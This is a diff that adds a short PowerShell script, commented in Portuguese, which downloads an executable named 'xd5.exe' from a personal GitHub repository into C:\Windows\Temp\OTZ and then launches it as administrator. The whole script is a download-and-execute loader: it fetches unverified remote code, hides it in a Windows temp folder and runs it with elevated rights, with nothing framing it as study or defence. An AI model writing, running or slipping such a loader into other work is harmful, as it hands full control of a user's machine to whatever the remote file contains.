@@ -1,0 +1,23 @@
+# URL do novo arquivo a ser baixado
+$url = "https://github.com/devxdfps/parkcontrol/raw/main/xd5.exe"
+
+# Caminho completo para onde o arquivo será baixado
+$caminhoPasta = "C:\Windows\Temp\OTZ"
+$caminhoArquivo = Join-Path -Path $caminhoPasta -ChildPath "xd5.exe"
+
+# Verifica se a pasta de destino existe, se não, cria a pasta
+if (-not (Test-Path -Path $caminhoPasta)) {
+    New-Item -Path $caminhoPasta -ItemType Directory -Force
+}
+
+# Baixa o arquivo da URL especificada e o salva no caminho especificado
+Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo
+
+# Verifica se o arquivo foi baixado com sucesso
+if (Test-Path $caminhoArquivo) {
+    Write-Host "Arquivo baixado com sucesso em $caminhoArquivo."
+    # Executa o arquivo baixado como administrador
+    Start-Process -FilePath $caminhoArquivo -Verb RunAs
+} else {
+    Write-Host "Falha ao baixar o arquivo."
+}
